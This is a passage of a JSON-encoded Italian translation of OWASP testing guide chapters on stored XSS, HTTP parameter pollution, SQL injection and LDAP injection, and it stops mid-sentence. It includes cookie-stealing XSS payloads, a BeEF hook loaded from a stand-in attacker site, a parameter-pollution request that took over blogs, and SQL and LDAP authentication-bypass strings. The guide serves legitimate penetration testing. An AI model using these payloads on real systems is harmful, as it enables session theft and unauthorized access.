      "how-to": "<h3>Come testare</h3><p>Il processo per individuare vulnerabilità di XSS persistente è simile a quello descritto per il testing di XSS riflesso.</p><p>Il primo passo consiste nell’individuare tutti i punti in cui l’input utente viene salvato nel backend e successivamente visualizzato dall’applicazione. Esempi tipici di input persistente possono trovarsi in:</p><ul><li>Pagine profilo utente: l’app permette la modifica dei dettagli del profilo come nome, cognome, nickname, avatar, foto, indirizzo, ecc.</li><li>Carrello: l’app consente di memorizzare elementi nel carrello per essere rivisti in seguito</li><li>File Manager: applicazioni che permettono l’upload di file</li><li>Impostazioni/preferenze applicative: app che consentono di impostare preferenze</li><li>Forum/Message board: app che permettono lo scambio di post tra utenti</li><li>Blog: se permette agli utenti di inserire commenti</li><li>Log: se l’app salva input dell’utente nei log</li></ul><p>L’input memorizzato viene normalmente inserito nei tag HTML, ma può trovarsi anche all’interno di contenuto JavaScript. In questa fase, è fondamentale capire se e come l’input viene memorizzato e posizionato nel contesto della pagina. Diversamente dall’XSS riflesso, il pentester dovrebbe investigare anche eventuali canali out-of-band attraverso cui l’app riceve e salva input utente.</p><p>Nota: Tutte le aree dell’app accessibili agli amministratori dovrebbero essere testate per individuare la presenza di dati inviati dagli utenti.</p><p>Esempio: Email memorizzata in index2.php</p><p>Figura 4.7.2-1: Esempio di input persistente</p><br><p>Il codice HTML di index2.php dove si trova il valore email:</p><pre><code><input class= \"inputbox\" type= \"text\" name= \"email\" size= \"40\" value= \" [email protected] \" /></code></pre><p>In questo caso, il tester deve trovare un modo per iniettare codice al di fuori del tag <input> come segue:</p><pre><code><input class= \"inputbox\" type= \"text\" name= \"email\" size= \"40\" value= \" [email protected] \" > CODICE MALEVOLO <!-- /></code></pre><p>Questo implica il test dei controlli di validazione e filtro dell’input dell’applicazione. Esempi basilari di iniezione in questo caso:</p><ul><li>[email protected]&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li><li>[email protected]%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</li></ul><p>Assicurarsi che l’input venga inviato tramite l’applicazione. Questo spesso richiede di disabilitare JavaScript se sono implementati controlli lato client o di modificare la richiesta HTTP tramite un web proxy. È importante testare la stessa iniezione sia tramite richieste HTTP GET che POST. L’iniezione sopra produrrà una finestra popup che mostra i cookie.</p><p>Figura 4.7.2-2: Esempio di input persistente</p><br><p>Il codice HTML successivo all’iniezione:</p><pre><code><input class= \"inputbox\" type= \"text\" name= \"email\" size= \"40\" value= \" [email protected] \" ><script> alert ( document . cookie ) </script></code></pre><p>L’input viene salvato e il payload XSS viene eseguito dal browser al reload della pagina. Se l’input viene sanificato dall’applicazione, i tester dovrebbero verificare la presenza di filtri XSS. Ad esempio, se la stringa “SCRIPT” viene sostituita con uno spazio o con carattere NULL, questo può essere sintomo di un filtro XSS in azione. Esistono molte tecniche per eludere i filtri d’input (vedi capitolo su XSS riflesso). Si raccomanda di consultare la XSS Filter Evasion e Mario XSS Cheat pages, che forniscono un ampio elenco di attacchi XSS e bypass dei filtri. Consulta anche la sezione whitepapers e tools per maggiori dettagli.</p><p>L’XSS persistente può essere sfruttato tramite framework avanzati di exploitation JavaScript come BeEF e XSS Proxy.</p><p>Uno scenario tipico di exploitation BeEF prevede:</p><ul><li>Iniettare un “hook” JavaScript che comunica col framework di exploitation browser-side (BeEF) dell’attaccante</li><li>Attendere che l’utente della app visiti la pagina vulnerabile dove viene visualizzato l’input persistente</li><li>Controllare il browser dell’utente tramite la console BeEF</li></ul><p>Il “hook” JavaScript può essere iniettato sfruttando la vulnerabilità XSS dell’applicazione.</p><p>Esempio: Iniezione BeEF in index2.php:</p><pre><code>[email protected] \"> <script src= https://attackersite/hook.js ></script></code></pre><p>Quando l’utente carica la pagina index2.php, lo script hook.js viene eseguito dal browser. È possibile accedere a cookie, screenshot dell’utente, clipboard e lanciare attacchi XSS complessi.</p><p>Figura 4.7.2-3: Esempio di iniezione BeEF</p><br><p>Questo attacco è particolarmente efficace su pagine vulnerabili visualizzate da molti utenti con privilegi diversi.</p><p>Se l’applicazione permette l’upload di file, è importante verificare se sia possibile caricare contenuti HTML. Ad esempio, se sono consentiti file HTML o TXT, un payload XSS può essere inserito nel file caricato. Il pentester deve verificare se il file upload consente di impostare MIME type arbitrari.</p><p>Considera la seguente richiesta HTTP POST per l’upload di file:</p><pre><code>POST /fileupload.aspx HTTP / 1.1 […] Content-Disposition : form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.txt\" Content-Type : text/plain test</code></pre><p>Questo difetto di progettazione può essere sfruttato in attacchi di tipo browser MIME mishandling. Ad esempio, file apparentemente innocui come JPG e GIF possono contenere un payload XSS che viene eseguito quando vengono caricati dal browser. Ciò è possibile quando il MIME type di un’immagine, ad esempio image/gif, può invece essere impostato a text/html. In tal caso il file sarà trattato dal browser come HTML.</p><p>Richiesta HTTP POST manipolata:</p><pre><code>Content-Disposition: form-data; name=\"uploadfile1\"; filename=\"C:\\Documents and Settings\\test\\Desktop\\test.gif\"\nContent-Type: text/html <script> alert ( document . cookie ) </script></code></pre><p>Considera inoltre che Internet Explorer gestisce i MIME type in modo diverso rispetto a Firefox o altri browser. Ad esempio, IE tratta i file TXT con contenuto HTML come se fossero HTML. Per ulteriori dettagli sulla gestione dei MIME, consulta la sezione whitepapers alla fine di questo capitolo.</p><p>Il Blind Cross-site Scripting è una forma di XSS persistente. In genere si verifica quando il payload dell’attaccante viene salvato su server/infrastruttura e successivamente riflesso alla vittima dall’app backend. Ad esempio, nei form di feedback, un attaccante può inviare il payload malevolo tramite il form, e quando l’utente/admin backend visualizza l’invio tramite l’applicazione, il payload dell’attaccante viene eseguito. Il Blind XSS è difficile da confermare nel mondo reale ma uno dei migliori strumenti è XSS Hunter.</p><p>Nota: I tester dovrebbero valutare con attenzione le implicazioni sulla privacy nell’utilizzo di servizi pubblici o di terze parti durante i test di sicurezza. (Vedi #tools.)</p><p>Il testing gray-box è simile al black-box. In questo caso, il pentester ha conoscenze parziali dell’applicazione. Può sapere come viene validato l’input utente o come viene memorizzato.</p><p>In base alle informazioni disponibili, si consiglia di verificare come l’input viene processato dall’app e memorizzato nel sistema backend. I seguenti passaggi sono raccomandati:</p><ul><li>Utilizzare il frontend dell’applicazione e inserire input con caratteri speciali/non validi</li><li>Analizzare la risposta dell’applicazione</li><li>Identificare la presenza di controlli di validazione input</li><li>Accedere al backend e verificare se e come viene memorizzato l’input</li><li>Analizzare il codice sorgente per capire come l’input memorizzato viene reso dall’applicazione</li></ul><p>Se si ha accesso al codice sorgente (white-box testing), tutte le variabili utilizzate nei form di input devono essere analizzate. In particolare, linguaggi come PHP, ASP e JSP utilizzano variabili/funzioni predefinite per memorizzare input dalle richieste HTTP GET e POST.</p><p>La seguente tabella riassume alcune variabili e funzioni speciali da cercare durante l’analisi del codice sorgente:</p><p>Nota: La tabella sopra è solo un riassunto dei parametri più importanti, ma tutti i parametri di input utente devono essere analizzati.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>PHP Charset Encoder (PCE): aiuta a codificare testi arbitrari in 65 tipi di charset utilizzabili nei payload personalizzati.</li><li>Hackvertor: strumento online che permette molteplici codifiche e offuscamento di JavaScript (o qualsiasi stringa).</li><li>BeEF: framework di exploitation browser-side. Strumento professionale per dimostrare l’impatto reale delle vulnerabilità browser.</li><li>XSS-Proxy: tool avanzato per attacchi Cross-Site Scripting (XSS).</li><li>Burp Proxy: proxy HTTP/S interattivo per testare e attaccare applicazioni web.</li><li>XSS Assistant: script Greasemonkey che permette di testare facilmente qualsiasi applicazione web per XSS.</li><li>Zed Attack Proxy (ZAP): proxy HTTP/S interattivo con scanner integrato.</li><li>XSS Hunter Portable: trova ogni tipo di XSS, incluso il blind XSS spesso trascurato.</li></ul><h3>Riferimenti</h3><ul><li>XSS Filter Evasion Cheat Sheet</li></ul><ul><li>Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Seconda Edizione, McGraw-Hill, 2006 - ISBN 0-07-226229-0</li><li>Dafydd Stuttard, Marcus Pinto - “The Web Application’s Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9</li><li>Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3</li></ul><ul><li>CERT: “CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests”</li><li>Amit Klein: “Cross-site Scripting Explained”</li><li>CGISecurity.com: “The Cross Site Scripting FAQ”</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-03": {
      "summary": "",
      "how-to": "",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-04": {
      "summary": "<h3>Riassunto</h3><p>L’HTTP Parameter Pollution (HPP) verifica la risposta dell’applicazione alla ricezione di più parametri HTTP con lo stesso nome; ad esempio, se il parametro username è incluso nei parametri GET o POST due volte.</p><p>Fornire più parametri HTTP con lo stesso nome può indurre un’applicazione a interpretare i valori in modi non previsti. Sfruttando questi effetti, un attaccante può essere in grado di bypassare la validazione dell’input, innescare errori applicativi o modificare valori di variabili interne. Poiché l’HTTP Parameter Pollution interessa un componente fondamentale di tutte le tecnologie web, esistono attacchi sia lato server che lato client.</p><p>Gli standard HTTP attuali non includono indicazioni su come interpretare più parametri di input con lo stesso nome. Ad esempio, la RFC 3986 definisce semplicemente il termine Query String come una serie di coppie campo-valore, e la RFC 2396 definisce le classi di caratteri riservati e non riservati delle query string. In assenza di uno standard, i componenti delle web application gestiscono questo edge case in modo diverso (vedi la tabella sotto per i dettagli).</p><p>Di per sé, questo non è necessariamente un’indicazione di vulnerabilità. Tuttavia, se lo sviluppatore non è consapevole del problema, la presenza di parametri duplicati può produrre un comportamento anomalo nell’applicazione, potenzialmente sfruttabile da un attaccante. Come spesso accade nella sicurezza, i comportamenti imprevisti sono una fonte di debolezze che in questo caso possono portare ad attacchi di HTTP Parameter Pollution. Per meglio introdurre questa classe di vulnerabilità e le possibili conseguenze degli attacchi HPP, è utile analizzare alcuni esempi reali scoperti in passato.</p><p>Nel 2009, subito dopo la pubblicazione della prima ricerca sull’HTTP Parameter Pollution, la tecnica ricevette attenzione dalla comunità di sicurezza come possibile metodo per bypassare i web application firewall.</p><p>Una di queste vulnerabilità, che riguardava le ModSecurity SQL Injection Core Rules, rappresenta un esempio perfetto di mismatch tra applicazioni e filtri. Il filtro ModSecurity applicava correttamente una deny list alla stringa: select 1,2,3 from table, bloccando quindi l’URL /index.aspx?page=select 1,2,3 from table. Tuttavia, sfruttando la concatenazione di più parametri HTTP, un attaccante poteva far sì che il server applicativo concatenasse la stringa dopo che il filtro ModSecurity aveva già accettato l’input. Ad esempio, l’URL /index.aspx?page=select 1&page=2,3 from table non attivava il filtro ModSecurity, ma il livello applicativo concatenava l’input ottenendo la stringa malevola completa.</p><p>Un’altra vulnerabilità HPP interessava Apple Cups, il noto sistema di stampa usato da molti sistemi Unix. Sfruttando HPP, un attaccante poteva facilmente innescare una vulnerabilità Cross-Site Scripting usando l’URL: https://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&kerberos. Il checkpoint di validazione dell’applicazione poteva essere bypassato aggiungendo un ulteriore argomento kerberos con una stringa valida (ad esempio vuota). Poiché il checkpoint di validazione considerava solo la seconda occorrenza, il primo parametro kerberos non veniva sanificato prima di essere usato per generare contenuto HTML dinamico. Lo sfruttamento aveva come risultato l’esecuzione di codice JavaScript nel contesto del sito ospitante.</p><p>Una vulnerabilità HPP ancora più critica fu scoperta su Blogger, la famosa piattaforma di blogging. Il bug consentiva ad utenti malevoli di prendere possesso del blog della vittima con la seguente richiesta HTTP (https://www.blogger.com/add-authors.do):</p><pre><code>POST /add-authors.do HTTP/1.1\n[...]\n\nsecurity_token=attackertoken & blogID=attackerblogidvalue & blogID=victimblogidvalue & authorsList=goldshlager19test%40gmail.com(attacker email) & ok=Invite</code></pre><p>Il problema era nel meccanismo di autenticazione: il controllo di sicurezza veniva effettuato sul primo parametro blogID, mentre l’operazione effettiva usava la seconda occorrenza.</p><p>La tabella seguente mostra come diverse tecnologie web si comportano in presenza di più occorrenze dello stesso parametro HTTP.</p><p>Dato l’URL e la querystring: https://example.com/?color=red&color=blue</p><p>(Fonte: Appsec EU 2009 Carettoni & Paola)</p><h3>Obiettivi del test</h3><ul><li>Identificare il backend e il metodo di parsing utilizzato.</li><li>Individuare i punti di injection e tentare di bypassare i filtri di input tramite HPP.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Fortunatamente, poiché l’assegnazione dei parametri HTTP viene normalmente gestita dal server applicativo web e non dal codice stesso, il test della risposta alla parameter pollution dovrebbe essere standard su tutte le pagine e azioni. Tuttavia, poiché è necessaria una conoscenza approfondita della business logic, il testing HPP richiede test manuali. Gli strumenti automatici possono solo aiutare parzialmente, poiché tendono a generare troppi falsi positivi. Inoltre, l’HPP può manifestarsi sia in componenti lato client che lato server.</p><p>Per individuare vulnerabilità HPP, identifica qualsiasi form o azione che permetta input utente. I parametri nella query string delle richieste HTTP GET sono facili da modificare nella barra di navigazione del browser. Se il form invia dati via POST, il tester dovrà utilizzare un proxy di intercettazione per alterare i dati POST inviati al server. Individuato il parametro da testare, si può modificare il dato GET o POST intercettando la richiesta, oppure cambiare la query string dopo il caricamento della pagina di risposta. Per testare la vulnerabilità, basta aggiungere lo stesso parametro nei dati GET o POST ma assegnandogli un valore diverso.</p><p>Ad esempio: se si testa il parametro search_string nella query string, l’URL di richiesta includerà il nome del parametro e il valore:</p><pre><code>https://example.com/?search_string=kittens</code></pre><p>Il parametro può essere nascosto tra altri parametri, ma l’approccio è lo stesso; lascia gli altri parametri e aggiungi il duplicato:</p><pre><code>https://example.com/?mode=guest&search_string=kittens&num_results=100</code></pre><p>Aggiungi lo stesso parametro con un valore diverso:</p><pre><code>https://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies</code></pre><p>e invia la nuova richiesta.</p><p>Analizza la risposta della pagina per capire quale valore/i sono stati interpretati. Nell’esempio sopra, i risultati potrebbero mostrare kittens, puppies, una combinazione dei due (kittens,puppies o kittens~puppies o ['kittens','puppies']), oppure produrre un risultato vuoto o una pagina di errore.</p><p>Questo comportamento (uso del primo, ultimo, o combinazione di parametri con lo stesso nome) sarà molto probabilmente consistente in tutta l’applicazione. Se tale comportamento rivela una potenziale vulnerabilità dipende dalla specifica validazione degli input e dai filtri di sicurezza. In generale: se i meccanismi di validazione sono sufficienti su singoli input e il server prende solo il primo o ultimo parametro, la parameter pollution non rivela una vulnerabilità. Se i parametri duplicati vengono concatenati, se componenti diversi usano occorrenze diverse o se il test genera un errore, aumenta la probabilità di poter sfruttare la pollution per innescare vulnerabilità.</p><p>Un’analisi più approfondita richiede tre richieste HTTP per ogni parametro:</p><p>Realizzare un exploit completo a partire da una debolezza di parameter pollution va oltre lo scopo di questo testo. Vedi i riferimenti per esempi e dettagli.</p><p>Analogamente all’HPP lato server, il test manuale è l’unica tecnica affidabile per verificare applicazioni web e identificare vulnerabilità di pollution lato client. Mentre lato server l’attaccante sfrutta l’app vulnerabile per accedere a dati protetti o compiere azioni non permesse, gli attacchi lato client mirano a sovvertire componenti e tecnologie client-side.</p><p>Per testare le vulnerabilità client-side HPP, identifica qualsiasi form o azione che accetti input utente e ne mostri il risultato all’utente stesso. Una pagina di ricerca è ideale, mentre una login box potrebbe non funzionare (se non mostra uno username non valido).</p><p>Come per l’HPP server-side, “inquina” ogni parametro HTTP con %26HPP_TEST e cerca occorrenze decodificate del payload fornito:</p><ul><li>&HPP_TEST</li><li>&amp;HPP_TEST</li><li>ecc.</li></ul><p>Presta particolare attenzione alle risposte che presentano vettori HPP all’interno di attributi data, src, href o nelle azioni dei form. Di nuovo, se il comportamento di default riveli una vulnerabilità dipende dalla validazione, dai filtri e dalla logica applicativa. Questa vulnerabilità può anche colpire parametri usati in XMLHttpRequest (XHR), creazione dinamica di attributi o plugin (es. flashvars di Adobe Flash).</p>",
      "tools": "<h3>Strumenti</h3><ul><li>ZAP Passive/Active Scanners</li></ul><h3>Riferimenti</h3><ul><li>HTTP Parameter Pollution - Luca Carettoni, Stefano di Paola</li><li>Esempio Client-side HTTP Parameter Pollution (vulnerabilità su Yahoo! Classic Mail) - Stefano di Paola</li><li>How to Detect HTTP Parameter Pollution Attacks - Chrysostomos Daniel</li><li>CAPEC-460: HTTP Parameter Pollution (HPP) - Evgeny Lebanidze</li><li>Automated Discovery of Parameter Pollution Vulnerabilities in Web Applications - Marco Balduzzi, Carmen Torrano Gimenez, Davide Balzarotti, Engin Kirda</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INPV-05": {
      "summary": "<h3>Riassunto</h3><p>Il test di SQL injection verifica se sia possibile iniettare dati in un’applicazione/sito in modo che venga eseguita una query SQL controllata dall’utente sul database. I tester rilevano una vulnerabilità di SQL injection se l’applicazione usa input utente per creare query SQL senza una corretta validazione. Lo sfruttamento di questa vulnerabilità consente a un utente non autorizzato di accedere o manipolare dati nel database, il che — come è facile intuire — è piuttosto grave.</p><p>Un attacco SQL injection consiste nell’inserimento o “iniezione” di una query SQL (parziale o completa) tramite dati provenienti dal client (browser) verso la web application. Un attacco SQLi riuscito può leggere dati sensibili dal database, modificarli (inserimento/aggiornamento/cancellazione), eseguire operazioni amministrative sul database (es. shutdown del DBMS), recuperare il contenuto di file presenti sul filesystem del DBMS o scrivere file sul filesystem, e in alcuni casi eseguire comandi sul sistema operativo. Gli attacchi SQLi sono una forma di attacco di iniezione in cui comandi SQL vengono iniettati in input di dati per influenzare l’esecuzione dei comandi SQL predefiniti.</p><p>In generale, le web application costruiscono statement SQL in modo dinamico, mescolando sintassi SQL scritta dai programmatori e dati forniti dall’utente. Ad esempio:</p><p>select title, text from news where id=$id</p><p>Nell’esempio sopra, la variabile $id contiene dati utente, mentre il resto della query è statico e scritto dal programmatore; ciò rende la query dinamica.</p><p>Poiché la query è costruita in questo modo, l’utente può fornire input appositamente creati per fare in modo che la query originale esegua azioni a sua scelta. L’esempio qui sotto mostra l’utente che fornisce “10 or 1=1”, modificando la logica della WHERE clause aggiungendo la condizione “or 1=1”.</p><p>select title, text from news where id=10 or 1=1</p><p>NOTA: Fai attenzione a iniettare la condizione OR 1=1 in una query SQL. Anche se apparentemente innocuo nel contesto, è comune che le applicazioni usino dati di una singola richiesta in più query. Se la condizione arriva in una UPDATE o DELETE, può causare perdita di dati.</p><p>Le tecniche di SQL Injection si distinguono in tre classi:</p><ul><li>Inband: i dati sono estratti tramite lo stesso canale usato per iniettare il codice SQL. È il caso più diretto: i dati recuperati sono mostrati subito nella pagina.</li><li>Out-of-band: i dati vengono recuperati tramite un canale diverso (es: ricezione via email dei risultati della query).</li><li>Inferenziale o Blind: non c’è trasferimento diretto di dati. Il tester deduce le informazioni inviando richieste specifiche e osservando il comportamento del database.</li></ul><p>Per sfruttare una SQL Injection occorre saper costruire una query SQL sintatticamente corretta. Se l’applicazione restituisce un messaggio di errore causato dalla query, sarà più semplice per l’attaccante ricostruire la logica della query originale. Se invece l’applicazione nasconde i dettagli d’errore, il tester dovrà ingegnerizzare al contrario la logica della query.</p><p>Le principali tecniche di exploit SQLi (che possono essere combinate) sono:</p><ul><li>Union Operator: sfruttabile in SELECT, consente di unire due query in un unico risultato.</li><li>Boolean: utilizza condizioni booleane per verificare true/false.</li><li>Error-based: forza il database a generare errori utili per affinare l’iniezione.</li><li>Out-of-band: recupera dati tramite canale differente (es: richiesta HTTP verso un server dell’attaccante).</li><li>Time delay: comandi (es. sleep) per ritardare le risposte in base a condizioni. Utile quando non si ottiene output o errori visibili.</li></ul><h3>Obiettivi del test</h3><ul><li>Identificare i punti di injection SQL.</li><li>Valutare la gravità e il livello di accesso ottenibile tramite l’exploit.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Il primo passo è individuare dove l’applicazione interagisce con il DB per accedere ai dati. Esempi tipici:</p><ul><li>Form di autenticazione: le credenziali sono spesso verificate interrogando un database di utenti/password.</li><li>Motori di ricerca: la stringa inserita viene usata in una query SQL per estrarre i record rilevanti.</li><li>Siti e-commerce: i prodotti e le loro caratteristiche (prezzo, descrizione, disponibilità) sono di norma salvati su database.</li></ul><p>Il tester deve elencare tutti i campi di input che potrebbero essere usati nella costruzione di query SQL, compresi i campi nascosti delle richieste POST, e testarli separatamente, tentando di interferire con la query e generare errori. Considera anche header HTTP e Cookie.</p><p>Il primo test consiste normalmente nell’aggiungere un apostrofo ' o un punto e virgola ; al campo/parametro sotto test. L’apostrofo viene usato in SQL come terminatore di stringa e, se non filtrato, produce errori di sintassi. Il punto e virgola termina uno statement SQL e, se non filtrato, può generare errori o eseguire query aggiuntive. L’output di un campo vulnerabile può essere simile a:</p><pre><code>Microsoft OLE DB Provider for ODBC Drivers error '80040e14'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the\ncharacter string ''.\n/target/target.asp, line 113</code></pre><p>Anche delimitatori di commento (-- o /* */) e parole chiave come AND e OR sono usati per tentare modifiche della query. Una tecnica semplice ma spesso efficace è inserire una stringa dove ci si aspetta un numero, per generare errori come:</p><pre><code>Microsoft OLE DB Provider for ODBC Drivers error '80040e07'\n[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the\nvarchar value 'test' to a column of data type int.\n/target/target.asp, line 113</code></pre><p>Analizza sempre tutte le risposte del server e il codice HTML/JavaScript risultante: l’errore può essere presente ma nascosto o nei commenti. Un messaggio d’errore dettagliato fornisce preziose informazioni per sfruttare la vulnerabilità. Se invece viene mostrato solo un “500 Server Error” o una pagina custom, occorre usare tecniche di blind injection. In ogni caso, testa ogni campo separatamente: solo una variabile per volta deve variare, per identificare esattamente quali parametri sono vulnerabili.</p><p>Esempio di query:</p><p>SELECT * FROM Users WHERE Username='$username' AND Password='$password'</p><p>Supponiamo di inserire:</p><p>$username = 1' or '1' = '1</p><p>$password = 1' or '1' = '1</p><p>La query risultante sarà:</p><p>SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'</p><p>NOTA: Come sopra, attenzione a or 1=1 in query che possono arrivare in UPDATE/DELETE.</p><p>Supponendo che i parametri siano inviati via GET e che il sito sia www.example.com :</p><p>https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1</p><p>La query ritorna sempre vero (or 1=1) e l’utente viene autenticato senza conoscere credenziali reali.</p><p>In certi sistemi la prima riga della tabella utenti è un amministratore, che può essere autenticato involontariamente.</p><p>Altro esempio:</p><p>SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))</p><p>Qui possono esserci problemi di parentesi e hash. Si possono chiudere parentesi e inserire un delimitatore di commento (/* o --). Ad esempio:</p><p>$username = 1' or '1' = '1'))/*</p><p>$password = foo</p><p>La query risultante sarà:</p><p>SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))</p><p>L’URL sarà:</p><p>https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo</p><p>Si può usare LIMIT per ottenere un solo risultato:</p><p>$username = 1' or '1' = '1')) LIMIT 1/*</p><p>Un esempio tipico di test su prodotti:</p><p>https://www.example.com/product.php?id=10 AND 1=2</p><p>La query SELECT * FROM products WHERE id_product=10 AND 1=2 restituirà probabilmente nessun risultato. Invia invece AND 1=1 e verifica la presenza di dati validi.</p><p>Se il DBMS e l’API lo consentono, si possono eseguire query multiple:</p><p>https://www.example.com/product.php?id=10; INSERT INTO users (…)</p><p>Ogni DBMS ha le sue peculiarità (comandi, funzioni, commenti, ecc.). Sapere quale DBMS è in uso è fondamentale: osserva gli errori restituiti dall’applicazione oppure usa UNION SELECT version(), ecc.</p><p>La tecnica UNION serve a unire i risultati di due query. Occorre scoprire il giusto numero di colonne tramite ORDER BY:</p><p>https://www.example.com/product.php?id=10 ORDER BY 10--</p><p>Se il numero è troppo alto, verrà mostrato un errore.</p><p>Poi usa UNION SELECT con valori NULL per capire i tipi di dato delle colonne. Se serve, imposta un ID inesistente per vedere solo il risultato della query iniettata.</p><p>In caso di query più complesse (sottoquery, alias, parametri condivisi su più query), l’injection può richiedere payload avanzati e ragionamento sul contesto della query.</p><p>Per Blind SQLi (inferenziale), si eseguono richieste booleane e si osservano le differenze tra risposta “true” e “false”. Si possono estrarre dati carattere per carattere tramite funzioni come SUBSTRING, ASCII, LENGTH ecc.</p><p>In Error-based, si forzano errori per esporre dati in messaggi di errore.</p><p>In Out-of-band, si usano funzioni DBMS per inviare dati a server dell’attaccante.</p><p>In Time-based, si usano funzioni di sleep/delay e si misura il tempo di risposta in base alla veridicità di una condizione.</p><p>Le tecniche di evasione più comuni: usare spazi/linee nuove/tab, null byte (%00), commenti inline, encoding (URL, Hex, Char()), concatenazione di stringhe, wildcards con LIKE, variabili SQL dichiarate a runtime.</p><p>Strumenti automatici: SQLMap e affini. Le tecniche di evasione servono a superare filtri WAF e IPS.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Stringhe fuzz SQLi (wfuzz, Fuzzdb)</li><li>sqlmap, tool automatico di SQL injection (Bernardo Damele A. G.)</li><li>MySqloit, tool takeover MySQL (Muhaimin Dzulfakar)</li><li>PayloadsAllTheThings - SQL Injection</li></ul><h3>Riferimenti</h3><ul><li>OWASP Top 10 2017-A1-Injection</li><li>SQL Injection</li></ul><p>Guide di test specifiche sono disponibili per:</p><ul><li>Oracle</li><li>MySQL</li><li>SQL Server</li><li>PostgreSQL</li><li>MS Access</li><li>NoSQL</li><li>ORM</li><li>Client-side</li></ul><ul><li>Victor Chapela: “Advanced SQL Injection”</li><li>Chris Anley: “More Advanced SQL Injection”</li><li>David Litchfield: “Data-mining with SQL Injection and Inference”</li><li>Imperva: “Blinded SQL Injection”</li><li>PortSwigger: “SQL Injection Cheat Sheet”</li><li>Kevin Spett (SPI Dynamics): “Blind SQL Injection”</li><li>“ZeQ3uL” (Prathan Phongthiproek), “Suphot Boonchamnan”: “Beyond SQLi: Obfuscate and Bypass”</li><li>Adi Kaploun, Eliran Goshen (Check Point): “The Latest SQL Injection Trends”</li></ul><ul><li>Analisi della SQL injection nel sistema di comment filtering di Drupal (SA-CORE-2015-003)</li></ul>",
      "remediation": "<h3>Rimedi</h3><ul><li>Per proteggere l’applicazione da SQLi, vedi la SQL Injection Prevention CheatSheet.</li><li>Per proteggere il database, vedi la Database Security CheatSheet.</li></ul><p>Per la validazione generica degli input, vedi la Input Validation CheatSheet.</p>",
      "test_objectives": ""
    },
    "WSTG-INPV-06": {
      "summary": "<h3>Riassunto</h3><p>Il Lightweight Directory Access Protocol (LDAP) viene utilizzato per memorizzare informazioni su utenti, host e molti altri oggetti. L’LDAP injection è un attacco lato server che può consentire la divulgazione, la modifica o l’inserimento di informazioni sensibili sugli utenti e host rappresentati in una struttura LDAP. Questo viene ottenuto manipolando i parametri di input che vengono poi passati a funzioni interne di ricerca, aggiunta o modifica.</p><p>Un’applicazione web può utilizzare LDAP per consentire l’autenticazione degli utenti o la ricerca di informazioni su altri utenti all’interno di una struttura aziendale. L’obiettivo degli attacchi LDAP injection è iniettare metacaratteri nei filtri di ricerca LDAP che saranno poi eseguiti dall’applicazione.</p><p>L’RFC2254 definisce una grammatica per costruire un filtro di ricerca LDAPv3 ed estende l’RFC1960 (LDAPv2).</p><p>Un filtro di ricerca LDAP è costruito in notazione polacca (prefix notation). Ad esempio, una condizione pseudocodice come:</p><p>find(\"cn=John & userPassword=mypass\")</p><p>sarà rappresentata come:</p><p>find(\"(&(cn=John)(userPassword=mypass))\")</p><p>Condizioni booleane e raggruppamenti nei filtri di ricerca LDAP si applicano utilizzando specifici metacaratteri.</p><p>Ulteriori esempi su come costruire filtri di ricerca sono disponibili nelle relative RFC.</p><p>Un attacco LDAP injection riuscito può consentire al tester di:</p><ul><li>Accedere a contenuti non autorizzati</li><li>Bypassare restrizioni applicative</li><li>Ottenere informazioni riservate</li><li>Aggiungere o modificare oggetti nella struttura LDAP</li></ul><h3>Obiettivi del test</h3><ul><li>Identificare i punti vulnerabili a LDAP injection.</li><li>Valutare la gravità dell’injection.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Supponiamo che una web application usi un filtro di ricerca come:</p><p>searchfilter=\"(cn=\"+user+\")\"</p><p>che viene valorizzato tramite una richiesta HTTP come:</p><p>https://www.example.com/ldapsearch?user=John</p><p>Se il valore John viene sostituito con *, inviando:</p><p>https://www.example.com/ldapsearch?user=*</p><p>il filtro sarà:</p><p>searchfilter=\"(cn=*)\"</p><p>che corrisponde a ogni oggetto con attributo ‘cn’ uguale a qualsiasi valore.</p><p>Se l’applicazione è vulnerabile a LDAP injection, potrebbe visualizzare alcuni o tutti gli attributi utente, a seconda del flusso applicativo e dei permessi dell’utente LDAP connesso.</p><p>Un tester può usare un approccio di tipo “trial-and-error”, inserendo nel parametro caratteri come (, |, &, * e altri, per verificare la gestione degli errori dell’applicazione.</p><p>Se una webapp usa LDAP per autenticare l’utente e risulta vulnerabile, è possibile bypassare l’autenticazione iniettando una query LDAP sempre vera (come nelle SQL/XPATH injection).</p><p>Ad esempio, se viene usato un filtro tipo:</p><p>searchlogin= \"(&(uid=\"+user+\")(userPassword={MD5}\"+base64(pack(\"H*\",md5(pass)))+\"))\";</p><p>Usando i seguenti valori:</p><pre><code>user=*)(uid=*))(|(uid=*\npass=password</code></pre><p>il filtro risultante sarà:</p><p>searchlogin=\"(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))\";</p><p>che è 